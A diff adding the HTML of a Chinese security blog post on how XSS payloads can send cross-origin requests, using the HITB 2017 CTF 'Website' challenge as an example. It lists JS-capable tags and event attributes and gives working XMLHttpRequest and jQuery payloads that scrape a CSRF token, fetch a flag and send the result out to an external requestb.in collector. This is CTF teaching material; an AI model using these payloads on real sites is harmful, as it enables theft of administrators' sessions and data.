@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      浅谈 XSS 发送外域请求 | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="在 xss 中，我们不只要通过 alert(1) 弹窗来验证是否存在 xss 漏洞，更多的是让管理员访问我们的 payload(比如后台审核留言) 来对外域发起请求从而获取管理员 cookie、后台地址、源码等。本文只介绍几种常见的方式，仅针对一般情况，并不针对有过滤和 CSP 的情况。 HTML 标签第一类是 img、video、audio、iframe、a 等标签，他们的 src 或 href">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈 XSS 发送外域请求 | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/08/30/浅谈-XSS-发送外域请求/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="在 xss 中，我们不只要通过 alert(1) 弹窗来验证是否存在 xss 漏洞，更多的是让管理员访问我们的 payload(比如后台审核留言) 来对外域发起请求从而获取管理员 cookie、后台地址、源码等。本文只介绍几种常见的方式，仅针对一般情况，并不针对有过滤和 CSP 的情况。 HTML 标签第一类是 img、video、audio、iframe、a 等标签，他们的 src 或 href">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="浅谈 XSS 发送外域请求 | HeartSky&#39;s blog">
+<meta name="twitter:description" content="在 xss 中，我们不只要通过 alert(1) 弹窗来验证是否存在 xss 漏洞，更多的是让管理员访问我们的 payload(比如后台审核留言) 来对外域发起请求从而获取管理员 cookie、后台地址、源码等。本文只介绍几种常见的方式，仅针对一般情况，并不针对有过滤和 CSP 的情况。 HTML 标签第一类是 img、video、audio、iframe、a 等标签，他们的 src 或 href">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">浅谈 XSS 发送外域请求</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-08-30" class="post-meta__date date">2017-08-30</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/XSS/">XSS</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>在 xss 中，我们不只要通过 <code>alert(1)</code> 弹窗来验证是否存在 xss 漏洞，更多的是让管理员访问我们的 payload(比如后台审核留言) 来对外域发起请求从而获取管理员 cookie、后台地址、源码等。本文只介绍几种常见的方式，仅针对一般情况，并不针对有过滤和 CSP 的情况。</p>
+<h3 id="HTML-标签"><a href="#HTML-标签" class="headerlink" title="HTML 标签"></a>HTML 标签</h3><p>第一类是 img、video、audio、iframe、a 等标签，他们的 src 或 href 属性可以让他们对外域发起请求。</p>
+<p>第二类是含有可以执行 JS 的属性的标签，具体属性如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formaction action href xlink:href autofocus src content data</span><br></pre></td></tr></table></figure></p>
+<p>比如(虽然太明显了。跳转的话可能更适合 CTF 吧，毕竟不用考虑同源问题了。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript:location.href</span>=<span class="string">"xxx"</span>&gt;</span>click me</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>第三类是可以执行事件的标签，因为事件就是定义了发生一个动作后要执行的 JS 代码。有下面这些：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onload onunload onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop</span><br></pre></td></tr></table></figure></p>
+<p>注意下面几点：</p>
+<ul>
+<li>有闭合标签的标签可以不闭合标签，浏览器会自动帮其闭合</li>
+<li>任意一个标签都有 onclick 和 onmouseover 属性，包括自定义标签</li>
+<li>标签属性值之间可以用空格 TAB 换行符 加号</li>
+</ul>
+<p>以及作为 XSS 来说最重要的 HTML 属性值是不能拼接的，因此不能通过第一类方法获取 cookie 等额外信息。不过 JS 的话是可以的。</p>
+<h3 id="JS-脚本"><a href="#JS-脚本" class="headerlink" title="JS 脚本"></a>JS 脚本</h3><p>分为直接写出来 <code>&lt;script&gt;xxxx&lt;/script&gt;</code> 和引入 <code>&lt;script src=xxxx&gt;&lt;/script&gt;</code> 的方式。</p>
+<p>以 HITB 2017 的 Website 题为例，<code>http://47.88.218.105:20010/action.php?callback=getInfo</code> 是存在 xss 的，会无过滤的把 callback 参数值回显出来，而我们可以提交 URL，并且 bot 会模拟点击，所以我们可以提交一个我们的 php 页面让他跳转到这个页面，把 getInfo 替换成我们的 JS。</p>
+<h4 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h4><p>简单粗暴<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.location = xxx</span><br><span class="line">location.href = xxx</span><br><span class="line"><span class="built_in">window</span>.location = xxx</span><br></pre></td></tr></table></figure></p>
+<p>因为这题因为 cookie 是 httponly 的，所以只能让管理员模拟 getFlag 请求然后再把结果页面发送回来，所以光跳转就不够用了，只能采用下面的方法</p>
+<h3 id="xhr-XMLHttpRequest"><a href="#xhr-XMLHttpRequest" class="headerlink" title="xhr(XMLHttpRequest)"></a>xhr(XMLHttpRequest)</h3><p>通用 payload<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> html =<span class="built_in">document</span>.body.innerHTML;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">"GET"</span>,<span class="string">"http://47.88.218.105:20010/getflag.php?csrftoken="</span>+html.slice(html.indexOf(<span class="string">'token'</span>)+<span class="number">8</span>,html.indexOf(<span class="string">"error"</span>)<span class="number">-3</span>), <span class="string">"true"</span>);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">		xhr2.open(<span class="string">"GET"</span>,<span class="string">"https://requestb.in/xkto8txk?flag="</span>+xhr.responseText,<span class="string">"true"</span>);</span><br><span class="line">        xhr2.send();</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h4><p>和上面的思路一样，但是换了种形式</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">'https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html =<span class="built_in">document</span>.body.innerHTML;</span><br><span class="line">    $.get(<span class="string">'getflag.php?csrftoken='</span>+html.slice(html.indexOf(<span class="string">'token'</span>)+<span class="number">8</span>,html.indexOf(<span class="string">"error"</span>)<span class="number">-3</span>),<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;$.post(<span class="string">'https://requestb.in/xkto8txk'</span>,&#123;<span class="attr">name</span>:data&#125;);&#125;);&#125; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>值得注意的是 getflag.php 页面注入的 JS 是在 csrftoken 所在的 html 前面，因此要延时执行或者等整个页面加载完再执行，这个地方坑了我。</p>
+<p>先这样，有需要再补充，明天早起赶火车 = =</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
